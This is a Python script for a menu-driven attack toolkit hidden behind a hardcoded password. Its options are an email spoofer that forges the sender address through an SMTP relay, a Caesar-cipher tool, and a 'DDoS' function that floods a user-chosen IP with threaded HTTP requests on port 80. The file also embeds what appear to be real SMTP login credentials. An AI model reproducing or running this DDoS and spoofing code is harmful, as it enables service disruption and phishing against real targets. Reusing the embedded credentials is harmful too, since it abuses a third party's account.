import sys
import time
import stdiomask
import os
import socket
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from prettytable import PrettyTable


def lines():
    print('------------------------')
def clear(): 
    os.system('cls')
    clear()
def encryption():
	def encrypt(string, shift):
		cipher = ''
		for char in string: 
			if char == ' ':
				cipher = cipher + char
			elif char == "'":
				cipher = cipher + char
			elif char == ',':
				cipher = cipher + char
			elif char == '!':
				cipher = cipher + char
			elif char == '?':
				cipher = cipher + char
			elif char == '&':
				cipher = cipher + char
			elif char == '.':
				cipher = cipher + char
			elif char == '@':
				cipher = cipher + char
			elif  char.isupper():
				cipher = cipher + chr((ord(char) + shift - 65) % 26 + 65)
			else:
				cipher = cipher + chr((ord(char) + shift - 97) % 26 + 97)
		
		return cipher
	def lines():
		print('-------------------------')

	def mains():
		print(' ')
		text = input(" Plaintext: ")
		s = int(input(" Key: "))
		lines()
		print(" Encrypted Message: ", encrypt(text, s))
		lines() 
	mains()
def decryption():
	def decrypt(string, shift):
		cipher = ''
		for char in string: 
			if char == ' ':
				cipher = cipher + char
			elif char == "'":
				cipher = cipher + char
			elif char == ',':
				cipher = cipher + char
			elif char == '!':
				cipher = cipher + char
			elif char == '?':
				cipher = cipher + char
			elif char == '&':
				cipher = cipher + char
			elif char == '.':
				cipher = cipher + char
			elif char == '@':
				cipher = cipher + char
			elif  char.isupper():
				cipher = cipher + chr((ord(char) - shift - 65) % 26 + 65)
			else:
				cipher = cipher + chr((ord(char) - shift - 97) % 26 + 97)
		
		return cipher
	def lines():
		print('-------------------------')

	def mains():
		print(' ')
		text = input(" Encrypted Text: ")
		s = int(input(" Key: "))
		lines()
		print(" Decrypted Message: ", decrypt(text, s))
		lines() 
		print(' ')
	mains()
def ddos():
    lines()
    print(' DDoS Attack')
    lines()
    target = input(' Target IP: ')
    if target == 'exit':
        main()
    else:
        pass
    fake_ip = '229.64.132.182'
    port = 80
    attack_num = 0
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            global attack_num
            attack_num += 1
            s.close()
    attack()
    for i in range(500):
        thread = threading.Thread(target = attack)
        thread.start()
    print(str(attack_num) + ' requests sent.')
    main()
    


def email_spoof():
    def main_e():
        email = 'icwtr.g0d@gmail.com'
        print('|------------------------|')
        print('| PERSONAL EMAIL SPOOFER |')
        print('|------------------------|')
        time.sleep(0.5)
        from_emails = input('\n Sender email: ')
        if from_emails == 'exit':
            main()
        else:
            pass
        name = input(' Sender name: ')
        password = '9JhWmHSvRIG5FDs0'
        recipient = input(' Recipient email: ')
        lines()

        subject = input(' Email subject: ')
        message = input(' Message:\n >> ')

        msg = MIMEMultipart()
        msg['Name'] = name
        msg['From'] = name + '<' + from_emails + '>'
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))
        server = smtplib.SMTP('smtp-relay.sendinblue.com', 587)
        server.starttls()
        try:
            server.login(email, password)
            text = msg.as_string()
            server.sendmail(from_emails, recipient, text)
            server.quit()
            print('\n')
            print(' Email successfully sent')
            time.sleep(1)
        except Exception as e:
            print('\n')
            print(e)
            time.sleep(0.75)
        
        def resend():
            email_resend = input(' Would you like to send another email? [y/n]\n $ ')
            if email_resend == 'y':
                main()
            elif email_resend == 'n':
                time.sleep(0.5)
                main()
            else:
                resend()
        resend()
    main_e()
def welcome_screen():
    print("""   
     __      __       .__                                    .___               
    /  \    /  \ ____ |  |   ____  ____   _____   ____       |   |____    ____  
    \   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \      |   \__  \  /    \ 
     \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/      |   |/ __ \|   |  \ 
      \__/\  /  \___  >____/\___  >____/|__|_|  /\___  > /\  |___(____  /___|  /
           \/       \/          \/            \/     \/  )/           \/     \/ """)
    time.sleep(0.5)
    print('\t\t\tHow could I be of assistance today?\n\t\t(You can type [help] to see the list of commands)\n\n')
def encrypt_decrypt():
    lines()
    print(' Encrypt/Decrypt Text')
    lines()
    def encrypt_or_decrypt():
        answer = input(' Would you like to [e]ncrypt or [d]ecrypt? (Type [exit] to leave..)\n $ ')
        if answer == 'e':
            encryption()
            main()
        elif answer == 'd':
            decryption()
            main()
        elif answer == 'exit':
            main()
        else:
            encrypt_or_decrypt()
    encrypt_or_decrypt()


def main():
    user_choice = input('\n $ ')
    if user_choice == 'help':
        choice_list1 = ['1', '2', '3']
        choice_list2 = ['Email Spoofer','Encrypt/Decrypt', 'DDoS IP Address']
        table = PrettyTable(['#', 'Your options'])
        for i in range(0,3):
            table.add_row([choice_list1[i], choice_list2[i]])
        print(table)
        main()
    elif user_choice == 'clear':
        def clear(): 
            if os.name == 'posix':
                _ = os.system('clear')
            else:
                _ = os.system('cls')
        clear()
        print("""   
     __      __       .__                                    .___               
    /  \    /  \ ____ |  |   ____  ____   _____   ____       |   |____    ____  
    \   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \      |   \__  \  /    \ 
     \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/      |   |/ __ \|   |  \ 
      \__/\  /  \___  >____/\___  >____/|__|_|  /\___  > /\  |___(____  /___|  /
           \/       \/          \/            \/     \/  )/           \/     \/ """)
        print('\t\t\tHow could I be of assistance today?\n\t\t(You can type [help] to see the list of commands)\n\n')  
        main()
    elif user_choice == '1':
        email_spoof()
    elif user_choice == '2':
        encrypt_decrypt()
    elif user_choice == '3':
        ddos()
    else:
        main()


validation = stdiomask.getpass(prompt = '\n Enter your password to continue: ', mask = '*')
if validation != 'Scabbed cann3d Cardiac prolonged':
    print(' LOGIN FAILED')
    print(' You are not authorized to view. Leaving now...')
    time.sleep(1)
    sys.exit()
else:
    print(' LOGIN CONFIRMED')
    time.sleep(0.75)
    welcome_screen()
    main()
